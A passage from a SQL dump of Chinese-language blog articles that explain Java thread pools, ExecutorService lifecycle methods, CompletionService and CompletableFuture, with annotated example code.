*/\n    private static void useShutDown(ExecutorService executorService) {\n        executorService.shutdown(); // 停止接收新任务,完成所有任务后关闭\n    }\n\n    /**\n     * shutdownNow\n     * 10 threads queue elements 10\n     * 10 running\n     * 10 stored in the blocking queue\n     *\n     * shutdownNow invoked                                      shutdownNow调用时\n     *  1. return list<Runnable> remain 10 un handle runnable.  把队列中的线程拿出来\n     *  2. interrupted all of threads in the pool               打断所有在pool里的线程\n     * @param executorService\n     */\n    private static void useShutDownNow(ExecutorService executorService) throws InterruptedException {\n        List<Runnable> runnablesList = null;\n        try {\n            runnablesList = executorService.shutdownNow();// 立即关闭,包括正在执行的线程,谨慎使用\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        executorService.awaitTermination(1, TimeUnit.HOURS);\n        System.out.println(\"=============over=============\");\n        System.out.println(executorService.isTerminated()); // true\n        System.out.println(runnablesList);\n        System.out.println(runnablesList.size());\n    }\n}\n```\n#### awaitTermination超时会终止任务执行吗\n```java\n/**\n * awaitTermination超时\n * {@link ExecutorService#awaitTermination(long, TimeUnit)} 阻塞等待任务完成,超时会导致立即返回,但不会终止线程池的任务执行\n */\npublic class ThreadPoolExecutorLongTimeTask {\n    public static void main(String[] args) throws InterruptedException {\n        ExecutorService executorService = new ThreadPoolExecutor(10, 20, 30, TimeUnit.SECONDS,\n                new ArrayBlockingQueue<Runnable>(10), r -> {\n                Thread t = new Thread(r);\n                t.setDaemon(true);\n                return t;\n        }, new ThreadPoolExecutor.AbortPolicy());\n        // pall\n        IntStream.range(0, 10).boxed().forEach(i->{\n            executorService.submit(()->{\n                while (true) {\n                    TimeUnit.SECONDS.sleep(1);\n                    System.out.println(\"========\");\n                }\n            });\n        });\n        // seq\n        executorService.shutdown();\n        executorService.awaitTermination(5, TimeUnit.SECONDS); // 阻塞等待任务完成,超时会导致立即返回,但不会终止线程池的任务执行\n        System.out.println(\"=========start the sequence working=========\");\n        TimeUnit.SECONDS.sleep(20);\n    }\n}\n```\n\n#### 执行一次任务后,是直接创建所有核心线程,还是懒加载式创建线程\n```java\n	/**\n     * 执行一次任务后,是直接创建所有核心线程,还是懒加载式创建\n     * 只是创建一个线程,是懒加载式创建\n     * @throws InterruptedException\n     */\n    private static void test() throws InterruptedException {\n        ThreadPoolExecutor executorService = (ThreadPoolExecutor)Executors.newFixedThreadPool(5);\n        System.out.println(executorService.getActiveCount());\n        executorService.execute(()->{\n            try {\n                TimeUnit.SECONDS.sleep(10);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n        TimeUnit.MILLISECONDS.sleep(20);\n        System.out.println(executorService.getActiveCount());// 1 只是创建了1个线程,而不是5个\n    }\n```\n\n#### 直接向队列中添加任务可以执行吗\n```java\n/**\n * 直接向队列中添加任务会被执行吗,会执行,但需要手动启动创建一个核心线程叫其进行处理\n * {@link ThreadPoolExecutor#getQueue()}\n * {@link java.util.concurrent.BlockingQueue#add(Object)}\n */\npublic class ExecutorServiceExample5 {\n    public static void main(String[] args) {\n        ThreadPoolExecutor executorService = (ThreadPoolExecutor)Executors.newFixedThreadPool(5);\n        executorService.prestartCoreThread();\n        executorService.getQueue().add(()->System.out.println(\"I am added directly into queue\"));\n    }\n}\n```\n\n### ExecutorService常见API\n#### 汇总\n1. shutdown周期API\n2. 手动启动创建核心线程\n3. 设置核心线程闲置超时自动销毁\n4. remove删除任务\n5. invokeAny执行多个任务,但只需成功一个\n6. invokeAll执行多个任务,返回Future集合\n7. submit使用Runnable获取返回值\n\n#### shutdown周期API\n```java\n	/**\n     *   shutdown相关方法\n     *  {@link ExecutorService#shutdown()} 调用shutdown.做出动作\n     *  {@link ExecutorService#isShutdown()} 调用过shutdown吗\n     * {@link ThreadPoolExecutor#isTerminating()}  是否正在shutdown进行中\n     * {@link ExecutorService#isTerminated()} shutdown结束了吗 销毁了吗\n     */\n    private static void isTerminated() throws InterruptedException {\n        ExecutorService executorService = Executors.newFixedThreadPool(1);\n        executorService.execute(()->{\n            try {\n                TimeUnit.SECONDS.sleep(2);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n        executorService.shutdown(); // 调用shutdown\n        System.out.println(executorService.isShutdown()); // true 调用过shutdown了吗\n        System.out.println(executorService.isTerminated()); // false 已经shutdown完毕销毁了吗\n        System.out.println(((ThreadPoolExecutor)executorService).isTerminating()); // true shutdown进行时\n        TimeUnit.SECONDS.sleep(10);\n        System.out.println(executorService.isTerminated()); // true\n    }\n```\n#### 手动启动创建核心线程\n```java\n	/**\n     * 手动启动创建核心线程\n     * {@link ThreadPoolExecutor#prestartCoreThread()} 启动一个核心线程，使其闲置地等待工作。\n     *  这将覆盖仅在执行新任务时启动核心线程的默认策略。如果所有核心线程已经启动，则此方法将返回{@code false}\n     * {@link ThreadPoolExecutor#prestartAllCoreThreads()} 启动所有的核心线程\n     */\n    private static void testPrestartCoreThread() {\n        ThreadPoolExecutor executorService = (ThreadPoolExecutor)Executors.newFixedThreadPool(2);\n        System.out.println(executorService.getActiveCount()); // 0\n        //  启动一个核心线程，使其闲置地等待工作。\n        //  这将覆盖仅在执行新任务时启动核心线程的默认策略。\n        //  如果所有核心线程已经启动，则此方法将返回{@code false}\n        System.out.println(executorService.prestartCoreThread()); // true\n        System.out.println(executorService.getActiveCount()); // 1\n\n        System.out.println(executorService.prestartCoreThread()); // true\n        System.out.println(executorService.getActiveCount()); // 1 or 2\n\n        System.out.println(executorService.prestartCoreThread()); // false\n        System.out.println(executorService.getActiveCount()); // 1 or 2\n    }\n```\n\n#### 设置核心线程闲置超时自动销毁\n```java\n	/**\n     * 设置核心线程闲置超时自动销毁\n     */\n    private static void testAllowCoreThreadTimeOut() {\n        ThreadPoolExecutor executorService = (ThreadPoolExecutor)Executors.newFixedThreadPool(5);\n        executorService.setKeepAliveTime(10, TimeUnit.SECONDS);\n        executorService.allowCoreThreadTimeOut(true); // 设置核心线程闲置超时自动销毁\n        IntStream.range(0, 5).boxed().forEach(i -> {\n            executorService.execute(()->{\n                try {\n                    TimeUnit.SECONDS.sleep(5);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            });\n        });\n    }\n```\n#### remove删除任务\n```java\n	/**\n     * 删除任务 remove方法使用\n     * @throws InterruptedException\n     */\n    private static void testRemove() throws InterruptedException {\n        ThreadPoolExecutor executorService = (ThreadPoolExecutor)Executors.newFixedThreadPool(2);\n        executorService.setKeepAliveTime(10, TimeUnit.SECONDS);\n        executorService.allowCoreThreadTimeOut(true); // 设置核心线程闲置超时自动销毁\n        IntStream.range(0, 2).boxed().forEach(i -> {\n            executorService.execute(()->{\n                try {\n                    TimeUnit.SECONDS.sleep(5);\n                    System.out.println(\"====I am finished\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            });\n        });\n        TimeUnit.MILLISECONDS.sleep(20);\n        Runnable r = () -> {\n          System.out.println(\"I will never be executed!\"); // 这个任务不会执行,被删除了\n        };\n        executorService.execute(r);\n        TimeUnit.MILLISECONDS.sleep(20);\n        boolean remove = executorService.remove(r);// 删除任务\n        System.out.println(remove); // true\n    }\n```\n\n#### invokeAny执行多个任务,但只需成功一个\n```java\n	/**\n     * Question:\n     *  when the result returned, other callable will be keep on process?\n     *  当结果返回时，其他可调用项将继续处理\n     * Answer:\n     *  other callable will be canceled(if other not process finished).\n     *  其他可调用项将被取消（如果其他未完成处理\n     * Note:\n     *  The invokeAny will be blocked caller. 调用invokeAny将会阻塞\n     *  适合请求多个相同资源的源,但只要成功一个即可,当一个成功,其他不用执行\n     * {@link ExecutorService#invokeAny(java.util.Collection)} 执行多个任务,但只需成功一个\n     */\n    private static void testInvokeAny() throws InterruptedException, ExecutionException {\n        ExecutorService executorService = Executors.newFixedThreadPool(10);\n        List<Callable<Integer>> callableList = IntStream.range(0, 5).boxed().map(i ->\n                (Callable<Integer>) () -> {\n                    TimeUnit.SECONDS.sleep(ThreadLocalRandom.current().nextInt(20));\n                    System.out.println(Thread.currentThread().getName() + \" : \" + i);\n                    return  i;\n                }\n        ).collect(toList());\n        Integer value = executorService.invokeAny(callableList); // 执行任意一个任务成功后就不执行其他了\n        System.out.println(\"========finished========\");\n        System.out.println(value);\n        executorService.shutdown();\n    } \n\n	/**\n     *  invokeAny超时将导致任务终止\n     * {@link ExecutorService#invokeAny(Collection, long, TimeUnit)}\n     */\n    private static void testInvokeAnyTimeOut() throws ExecutionException, InterruptedException {\n        ExecutorService executorService = Executors.newFixedThreadPool(10);\n        Integer value = null;\n        try {\n            value = executorService.invokeAny(IntStream.range(0, 5).boxed().map(i ->\n                    (Callable<Integer>) () -> {\n                        TimeUnit.SECONDS.sleep(5);\n                        System.out.println(Thread.currentThread().getName() + \" : \" + i);\n                        return i;\n                    }\n            ).collect(toList()), 3, TimeUnit.SECONDS);\n        } catch (TimeoutException e) {\n            System.out.println(\"invokeAny TimeOut\");\n        }\n        System.out.println(\"========finished========\");\n        System.out.println(value);\n        executorService.shutdown();\n    }\n```\n#### invokeAll执行多个任务,返回Future集合\n```java\n	/**\n     * 执行多个任务,返回Future集合\n     * {@link ExecutorService#invokeAll(Collection)} 将所有任务执行结束,返回Future\n     */\n    private static void testInvokeAll() throws InterruptedException, ExecutionException, TimeoutException {\n        ExecutorService executorService = Executors.newFixedThreadPool(10);\n        List<Future<Integer>> futures = executorService.invokeAll(IntStream.range(0, 5).boxed().map(i ->\n                (Callable<Integer>) () -> {\n                    TimeUnit.SECONDS.sleep(5);\n                    System.out.println(Thread.currentThread().getName() + \" : \" + i);\n                    return i;\n                }\n        ).collect(toList()));\n        futures.parallelStream().map(future -> {\n            try {\n                return future.get();\n            } catch (Exception e) {\n                throw new RuntimeException(e);\n            }\n        }).forEach(System.out::println);\n        System.out.println(\"========finished========\");\n    }\n\n	/**\n     * invokeAll超时将导致任务终止\n     * {@link ExecutorService#invokeAll(Collection, long, TimeUnit)}\n     */\n    private static void testInvokeAllTimeOut() throws InterruptedException{\n        ExecutorService executorService = Executors.newFixedThreadPool(10);\n        List<Future<Integer>> futures = executorService.invokeAll(IntStream.range(0, 5).boxed().map(i ->\n                (Callable<Integer>) () -> {\n                    TimeUnit.SECONDS.sleep(3);\n                    System.out.println(Thread.currentThread().getName() + \" : \" + i);\n                    return i;\n                }\n        ).collect(toList()), 2, TimeUnit.SECONDS);\n        futures.parallelStream().map(future -> {\n            try {\n                return future.get();\n            } catch (Exception e) {\n                System.out.println(\"invokeAll Exception\");\n                e.printStackTrace();\n            }\n            return null;\n        }).forEach(System.out::println);\n        System.out.println(\"========finished========\");\n    }\n```\n#### submit使用Runnable获取返回值\n```java\n	/**\n     *  submit返回的是一个Future\n     * {@link ExecutorService#submit(Runnable)} 执行任务,返回一个Future\n     */\n    private static void testSubmitRunnable() throws ExecutionException, InterruptedException {\n        ExecutorService executorService = Executors.newFixedThreadPool(10);\n        Future<?> future = executorService.submit(() -> {\n\n        });\n        Object NULL = future.get();\n        System.out.println(\"R:\" + NULL);\n    }\n\n    /**\n     * 使用Runnable如何获取返回值,result可以使用一个对象,在线程任务中对其赋值\n     * {@link ExecutorService#submit(Runnable, Object)} 第一个参数任务逻辑过程,第二个参数结果对象\n     */\n    private static void testSubmitRunnableWithResult() throws ExecutionException, InterruptedException {\n        ExecutorService executorService = Executors.newFixedThreadPool(10);\n        Message message = new Message();\n        Future<Message> future = executorService.submit(new Runnable() {\n            @Override\n            public void run() {\n                message.setResult(\"done\");\n            }\n        }, message);\n        Message result = (Message)future.get();\n        System.out.println(\"R:\" + result.getResult());\n    }\n\n    static class Message {\n        private String result;\n\n        public void setResult(String result) {\n            this.result = result;\n        }\n\n        public String getResult() {\n            return result;\n        }\n    }\n```', 0, 0, 34, 0, 0, '2019-10-16 21:32:35', '2019-10-16 23:45:25', 0, 0);
INSERT INTO `article` VALUES (120, 1, '线程池执行错误处理与CompletionService使用', '2019/10/1571239870_mmexport1570975716238.jpg', '### 线程池执行错误处理\n#### 自定义ThreadFactory处理线程池中发生的错误\n```java\n	/**\n     * 运行中出错,该如果处理\n     * 创建自定义的ThreadFactory,重写newThread方法,在setUncaughtExceptionHandler中处理错误\n     */\n    private static void executeRunnableError() throws InterruptedException {\n        ExecutorService executorService = Executors.newFixedThreadPool(10, new MyThreadFactory());\n        IntStream.range(0, 10).boxed().forEach(i -> executorService.execute(()->{\n            System.out.println(1 / 0);\n        }));\n        executorService.shutdown();\n        executorService.awaitTermination(10, TimeUnit.MINUTES);\n        System.out.println(\"===========================\");\n    }\n\n    private static class MyThreadFactory implements ThreadFactory {\n        private final static AtomicInteger SEQ = new AtomicInteger();\n        @Override\n        public Thread newThread(Runnable r) {\n            Thread thread = new Thread(r);\n            thread.setName(\"My-Thread-\" + SEQ.getAndIncrement());\n            thread.setUncaughtExceptionHandler((t, cause)->{\n                System.out.println(\"The thread\" + t.getName() + \" execute failed\");\n                cause.printStackTrace();\n                System.out.println(\"========handle error===========\");\n            });\n            return thread;\n        }\n    }\n```\n#### 自定义ThreadFactory使用模板设计模式解决线程池运行中错误\n```java\n	/**                                  | --->\n     *                                   | --->\n     * send request -> store db -> 10 -> | --->\n     *                                   | --->\n     *                                   | --->\n     * 自定义ThreadFactory使用模板设计模式解决线程池运行中出错\n     */\n    private static void executeRunnableTask() throws InterruptedException {\n        ExecutorService executorService = Executors.newFixedThreadPool(10, new MyThreadFactory());\n        IntStream.range(0, 10).boxed().forEach(i -> executorService.execute(new MyTask(i) {\n            @Override\n            protected void error(Throwable cause) {\n                System.out.println(\"The no:\" + i + \" failed, update status to ERROR\");\n            }\n\n            @Override\n            protected void done() {\n                System.out.println(\"The no:\" + i + \" successfully, update status to DONE\");\n            }\n\n            @Override\n            protected void doExecute() {\n                if (i % 3 == 0) {\n                    int tmp = 1 / 0;\n                }\n            }\n\n            @Override\n            protected void doInit() {\n\n            }\n        }));\n        executorService.shutdown();\n        executorService.awaitTermination(10, TimeUnit.MINUTES);\n        System.out.println(\"===========================\");\n    }\n\n    private static abstract class MyTask implements Runnable {\n        private final int no;\n        private MyTask(int no) {\n            this.no = no;\n        }\n\n        @Override\n        public void run() {\n            try {\n                this.doInit();\n                this.doExecute();\n                this.done();\n            } catch (Throwable cause) {\n                this.error(cause);\n            }\n        }\n\n        protected abstract void error(Throwable cause);\n\n        protected abstract void done();\n\n        protected abstract void doExecute();\n\n        protected abstract void doInit();\n    }\n```\n#### 自定义ThreadPoolExecutor使用AOP处理解决线程池执行错误\n```java\n	/**\n     * 自定义ThreadPoolExecutor使用AOP处理执行与错误\n     *  {@link ThreadPoolExecutor#beforeExecute(Thread, Runnable)} 执行任务前调用\n     * {@link ThreadPoolExecutor#afterExecute(Runnable, Throwable)} 执行任务后调用,如果错误,e是异常对象\n     */\n    private static void testThreadPoolAdvice() {\n        ThreadPoolExecutor executorService = new MyThreadPoolExecutor(1, 2, 30, TimeUnit.SECONDS,\n                new ArrayBlockingQueue<>(1), r -> {\n            Thread t = new Thread(r);\n            return t;\n        }, new ThreadPoolExecutor.AbortPolicy());\n\n        executorService.execute(new MyRunnable(1) {\n            @Override\n            public void run() {\n                System.out.println(\"==============\");\n                int i = 1 / 0;\n            }\n        });\n    }\n\n    private static abstract class MyRunnable implements Runnable {\n        private final int no;\n        protected MyRunnable(int no) {\n            this.no = no;\n        }\n        protected int getData() {\n            return this.no;\n        }\n    }\n\n    private static class MyThreadPoolExecutor extends ThreadPoolExecutor {\n\n        public MyThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue) {\n            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue);\n        }\n        public MyThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory) {\n            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory);\n        }\n        public MyThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, RejectedExecutionHandler handler) {\n            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, handler);\n        }\n        public MyThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {\n            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);\n        }\n\n        @Override\n        protected void beforeExecute(Thread t, Runnable r) {\n            System.out.println(\"init the \"+ ((MyRunnable)r).getData());\n        }\n\n        @Override\n        protected void afterExecute(Runnable r, Throwable t) {\n            if (null == t) {\n                System.out.println(\"successfully \" + ((MyRunnable)r).getData());\n            } else {\n                System.out.println(\"failed \");\n                t.printStackTrace();\n            }\n        }\n    }\n```\n### ExecutorService的缺陷\n#### Future没有回调函数通知\n```java\n	/**\n     * Future没有callback,导致调用get会进入阻塞等待状态\n     * @throws ExecutionException\n     * @throws InterruptedException\n     */\n    private static void futureDefect1() throws ExecutionException, InterruptedException {\n        ExecutorService executorService = Executors.newFixedThreadPool(2);\n        Future<Integer> future = executorService.submit(() -> {\n            sleepSeconds(100);\n            return 100;\n        });\n        System.out.println(\"==============\");\n        future.get();\n    }\n```\n#### 被最长的执行任务阻塞等待\n```java\n	/**\n     *  被最长的执行任务阻塞等待\n     *  假设两个任务;任务A与任务B\n     *      任务A: 处理需要10秒\n     *      任务B: 处理需要20秒\n     *  使用get进行获取的时候,可能是获取任务B的\n     *  在get阻塞等待任务B的时候,任务A早早就已经完成却没有被get\n     * @throws InterruptedException\n     * @throws ExecutionException\n     */\n    private static void futureDefect2() throws InterruptedException, ExecutionException {\n        ExecutorService executorService = Executors.newFixedThreadPool(2);\n        final List<Callable<Integer>> callableList = Arrays.asList(()->{\n            sleepSeconds(10);\n            System.out.println(\"The 10 finished\");\n            return 10;\n        }, ()->{\n            sleepSeconds(20);\n            System.out.println(\"The 20 finished\");\n            return 20;\n        });\n        List<Future<Integer>> futures = executorService.invokeAll(callableList);\n        Integer v2 = futures.get(1).get();\n        System.out.println(v2);\n        Integer v1 = futures.get(0).get();\n        System.out.println(v1);\n    }\n```\n### CompletionService\n#### 解决被最长的执行任务阻塞等待问题\n```java\n	/**\n     * 解决被最长的执行任务阻塞等待问题\n     * ExecutorCompletionService会将执行成功的任务放入一个队列当中\n     * 使用take方法取出即可将最快执行完成的任务结果取出\n     * {@link ExecutorCompletionService#take()}\n     * @param args\n     * @throws ExecutionException\n     * @throws InterruptedException\n     */\n    public static void main(String[] args) throws ExecutionException, InterruptedException {\n        ExecutorService service = Executors.newFixedThreadPool(5);\n        List<Runnable> tasks = IntStream.range(0, 5).boxed().map(ComplexExample::toTask).collect(Collectors.toList());\n\n        final ExecutorCompletionService<Object> executorCompletionService = new ExecutorCompletionService<>(service);\n\n        tasks.forEach( r -> executorCompletionService.submit(Executors.callable(r)));\n\n        Future<?> future;\n        while ((future = executorCompletionService.take()) != null) {\n            System.out.println(future.get());\n        }\n    }\n\n    private static Runnable toTask(int i) {\n        return () -> {\n            try {\n                System.out.printf(\"The Task [%d] will be executed\\n\", i);\n                TimeUnit.SECONDS.sleep(i * 5 + 10);\n                System.out.printf(\"The Task [%d] will be done\\n\", i);\n            } catch (InterruptedException e) {\n                System.out.printf(\"The Task [%d] be interrupted\\n\", i);\n                e.printStackTrace();\n            }\n        };\n    }\n```\n#### ExecutorService使用runnable获取返回结果\n```java \n	/**\n     *  ExecutorService使用runnable获取返回结果\n     * {@link ExecutorCompletionService#submit(Runnable, Object)} 第一个参数是runnable,第二个参数是返回结果对象\n     * @throws InterruptedException\n     * @throws ExecutionException\n     */\n    public static void testExecutorCompletionService2() throws InterruptedException, ExecutionException {\n        ExecutorService executorService = Executors.newFixedThreadPool(2);\n        ExecutorCompletionService<Event> executorCompletionService = new ExecutorCompletionService(executorService);\n        final Event event = new Event(1);\n        executorCompletionService.submit(new MyTask(event), event); // 设置返回结果对象\n        System.out.println(executorCompletionService.take().get().result);\n        executorService.shutdown();\n    }	\n\n    private static class MyTask implements Runnable {\n        private final Event event;\n        public MyTask(Event event) {\n            this.event = event;\n        }\n        @Override\n        public void run() {\n            sleepSeconds(10);\n            event.setResult(\"I AM SUCCESSFULLY\");\n        }\n    }\n\n    private static class Event {\n        final private int eventId;\n        private String result;\n        public Event(int eventId) {\n            this.eventId = eventId;\n        }\n\n        public int getEventId() {\n            return eventId;\n        }\n\n        public String getResult() {\n            return result;\n        }\n\n        public void setResult(String result) {\n            this.result = result;\n        }\n    }\n\n    private static void sleepSeconds(long seconds) {\n        try {\n            TimeUnit.SECONDS.sleep(seconds);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n```\n#### 期望一段时间内执行任务列表内任务,若超时,将未完成的任务返回\n```java\n	/**\n     *  期望一段时间内执行某些,若超时,将未完成的任务返回\n     *  期望21秒内完成所有,若超时,将20秒内未完成的任务返回出来\n     * @param args\n     * @throws InterruptedException\n     * @throws ExecutionException\n     */\n    public static void main(String[] args) throws InterruptedException, ExecutionException {\n        ExecutorService service = Executors.newFixedThreadPool(5);\n        List<Callable<Integer>> tasks = IntStream.range(0, 5).boxed().map(MyTask::new).collect(Collectors.toList());\n        final ExecutorCompletionService<Integer> executorCompletionService = new ExecutorCompletionService<>(service);\n        tasks.forEach(executorCompletionService::submit);\n        TimeUnit.SECONDS.sleep(21);\n        service.shutdownNow();\n        // 未完成的任务集合\n        List<Callable<Integer>> unfinishedTaskList = tasks.stream().filter(callable -> !((MyTask) callable).isSuccess()).collect(Collectors.toList());\n        unfinishedTaskList.forEach(System.out::println);\n    }\n\n    private static class MyTask<Integer> implements Callable<Integer> {\n        private final Integer value;\n        private boolean success = false;// 自定义标志决定是否成功\n        public MyTask(Integer value) {\n            this.value = value;\n        }\n        @Override\n        public Integer call() throws Exception {\n            System.out.printf(\"The Task [%d] will be executed\\n\", value);\n            TimeUnit.SECONDS.sleep(Long.parseLong(value.toString()) * 5 + 10);\n            System.out.printf(\"The Task [%d] will be done\\n\", value);\n            success = true; // 完成任务\n            return value;\n        }\n\n        public boolean isSuccess() {\n            return success;\n        }\n    }\n```', 0, 0, 37, 0, 0, '2019-10-16 23:31:19', '2019-10-17 13:38:57', 0, 0);
INSERT INTO `article` VALUES (121, 1, 'CompletableFuture-JDK8', '2019/10/1571315822_mmexport1571315355464.jpg', '### CompletableFuture\n#### CompletableFuture\n1. 诞生于JDK8,它的目的是解决JDK原生Future的一些缺陷\n2. 它提供了大量API支持级联操作,解决使用原生Future的一些问题\n3. 它使用了同样是JDK8的**CompletionService**作为依赖\n\n#### 原生Future的缺陷\n1. 调用Future.get()方法会造成阻塞等待,不支持事件驱动的回调函数\n2. 提供的状态API不够细粒度\n3. 不支持级联操作,比较繁琐\n\n### CompletableFuture的使用\n#### 汇总\n1. **supplyAsync**: 执行一个Future任务,有返回值\n2. **runAsync**: 执行一个Future任务,无返回值\n3. **whenComplete**: 将值与异常进行消费处理\n4. **handleAsyncwhenComplete**: 将值与异常进行处理,有返回值\n5. **thenApply**: 将一个值进行处理转换为另一个值\n6. **exceptionally**: 处理级联操作中的异常错误\n7. **thenRun**: 运行一些额外任务\n8. **thenCompose**: 接收第一个结果作为第二个的输入\n9. **thenAcceptBoth**: 运行两个Future都结束后处理两个Future结果\n10. **acceptEither**: 运行两个Future,只关注最先执行完毕的Future处理结果\n11. **runAfterBoth**: 运行两个Future都结束后处理\n12. **runAfterEither**: 运行两个Future,只关注最先执行完毕的Future处理\n13. **thenCombine**: 运行两个Future都结束后处理结果,处理后返回boolean\n14. **getNow**: 设定get的默认值\n15. **complete**: 设定get的默认值并得知是否还未获得执行结果\n16. **join**: 隐藏异常的get\n17. **completeExceptionally**: get时不进入阻塞等待,而是直接抛出异常\n18. **obtrudeException**: 放弃Future,get时直接抛出异常\n19. **allOf**: 运行多个任务,所有任务都结束后处理结果\n20. **anyOf**: 运行多个任务,只关注最先执行完毕的任务处理结果\n\n\n#### supplyAsync执行一个Future任务,有返回值\n```java\n	/**\n     *  supplyAsync执行一个Future任务,有返回值\n     * {@link CompletableFuture#supplyAsync(Supplier)} 执行一个{@link Supplier 生产者}任务,有返回值\n     */\n    public static void supplyAsync() throws ExecutionException, InterruptedException {\n        CompletableFuture<String> future = CompletableFuture.supplyAsync(() -> {\n            try {\n                System.out.println(\"before\");\n                TimeUnit.SECONDS.sleep(1);\n                System.out.println(\"after\");\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            return \"Data\";\n        });\n        TimeUnit.SECONDS.sleep(2);\n        System.out.println(future.get());\n    }\n```\n\n#### runAsync执行一个Future任务,无返回值\n```java\n	/**\n     * runAsync执行一个Future任务,无返回值\n     * {@link CompletableFuture#runAsync(Runnable)} 执行一个{@link Runnable 执行器}任务,无返回值\n     */\n    public static void runAsync() throws InterruptedException, ExecutionException {\n        CompletableFuture<Void> future = CompletableFuture.runAsync(() -> {\n            try {\n                System.out.println(\"before\");\n                TimeUnit.SECONDS.sleep(1);\n                System.out.println(\"after\");\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n        TimeUnit.SECONDS.sleep(2);\n        System.out.println(future.get());\n    }\n```\n\n\n#### whenComplete将值与异常进行消费处理,无返回值\n```java\n	/**\n     * whenComplete将值与异常进行消费处理,接收参数是{@link BiConsumer}\n     * whenComplete实现Future的回调通知\n     * 接收一个BiConsumer 处理结果和异常\n     * {@link CompletableFuture#whenComplete(BiConsumer)} 相当于Future的执行得到结果后的回调函数\n     */\n    public static void whenComplete() throws ExecutionException, InterruptedException {\n        CompletableFuture<String> future = CompletableFuture.supplyAsync(() -> \"Hello\");\n        future.whenComplete((str, throwable) -> {\n            System.out.println(\"whenComplete: \" + str);\n        });\n        System.out.println(\"get:\" + future.get());\n    }\n\n    /**\n     * whenComplete与whenCompleteAsync区别\n     * whenCompleteAsync阻塞接下来get方法,因为whenCompleteAsync是异步的\n     * whenComplete\n     *  before: ===========\n     *  after: =====over=====\n     *  get: Hello\n     *\n     * whenCompleteAsync\n     *  before: ===========\n     *  get: Hello\n     *  after: =====over=====\n     */\n    public static void whenCompleteAsync() throws InterruptedException, ExecutionException {\n        /*CompletableFuture<String> future = CompletableFuture.supplyAsync(() -> \"Hello\")\n                    .whenComplete((v, t) -> System.out.println(v+\" done\"));*/\n        CompletableFuture<String> future = CompletableFuture.supplyAsync(() -> \"Hello\");\n        // whenCompleteAsync这个方法是异步的\n        future.whenComplete((v, t)->{\n            try {\n                System.out.println(\"before: ===========\");\n                TimeUnit.SECONDS.sleep(10);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(\"after: =====over=====\");\n        });\n        System.out.println(\"get: \"+ future.get());\n    }\n```\n#### handleAsyncwhenComplete将值与异常进行处理,有返回值\n```java\n	/**\n     * handleAsync将值与异常进行处理,有返回值\n     * 接收参数是 {@link java.util.function.BiFunction} 接收两个值并返回一个值\n     * {@link CompletableFuture#handleAsync } 接收结果和异常两个参数,并进行处理\n     * 与whenComplete的区别是可返回值\n     */\n    public static void handleAsync() throws ExecutionException, InterruptedException {\n        CompletableFuture<Integer> future = CompletableFuture.supplyAsync((Supplier<String>) () -> {\n          throw new RuntimeException(\"no get the data\");\n        }).handleAsync((s, throwable) -> {\n            Optional.of(throwable).ifPresent(e -> System.out.println(\"Error\"));\n            return (s == null) ? 0 : s.length();\n        });\n        System.out.println(future.get());\n    }\n```\n#### thenApply将一个值进行处理转换为另一个值\n```java\n	/**\n     * thenApply将一个值进行处理转换为另一个值,接收参数是{@link java.util.function.Function}\n     * {@link CompletableFuture#thenApply} 级联操作,将输入的值转换为另一个值\n     * thenApply\n     *  =====\n     *  =====over=====\n     *  Hello\n     *  5\n     *\n     * thenApplyAsync\n     *  Hello\n     *  =====\n     *  =====over=====\n     *  5\n     */\n    public static void thenApply() throws InterruptedException, ExecutionException {\n        CompletableFuture<String> future = CompletableFuture.supplyAsync(() -> \"Hello\");\n        CompletableFuture<Integer> future2 = future.thenApply(s -> {\n            System.out.println(\"=====\");\n            try {\n                TimeUnit.SECONDS.sleep(10);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(\"=====over=====\");\n            return s.length();\n        });\n        System.out.println(future.get()); // Hello\n        System.out.println(future2.get()); // 5\n    }\n```\n#### exceptionally处理级联操作中的异常错误\n```java\n	/**\n     * exceptionally处理级联操作中的异常错误\n     * {@link CompletableFuture#exceptionally} 处理级联操作中的异常错误\n     * @return\n     */\n    private static CompletableFuture<String> errorHandle() {\n        CompletableFuture<String> future = CompletableFuture.supplyAsync(() -> {\n            // sleep(5);\n            System.out.println(\"=====I will be still process...=====\");\n            return \"HELLO\";\n        });\n        future.thenApply(s -> {\n            Integer.parseInt(s); // 会出异常,字符串转Integer\n            System.out.println(\"=====keep move.=====\");\n            return s + \" WORLD\";\n        }).exceptionally(Throwable::getMessage).thenAccept(System.out::println);\n        return future;\n    }\n```\n\n#### thenRun运行一些额外任务\n```java\n	/**\n     * thenRun运行一些额外任务\n     * thenRun\n     *  done\n     *  done2\n     *  Hello\n     *  null\n     *\n     * thenRunAsync\n     *  Hello\n     *  done\n     *  done2\n     *  null\n     * {@link CompletableFuture#thenRun(Runnable)} 同时运行一些任务\n     * {@link CompletableFuture#toCompletableFuture()} 返回this\n     */\n    public static void thenRun() throws ExecutionException, InterruptedException {\n        // toCompletableFuture 返回this\n        CompletableFuture<String> future = CompletableFuture.supplyAsync(() -> \"Hello\").toCompletableFuture();\n        CompletableFuture<Void> future2 = future.thenRunAsync(() -> {\n            try {\n                TimeUnit.SECONDS.sleep(5);\n                System.out.println(\"done\");\n            } catch 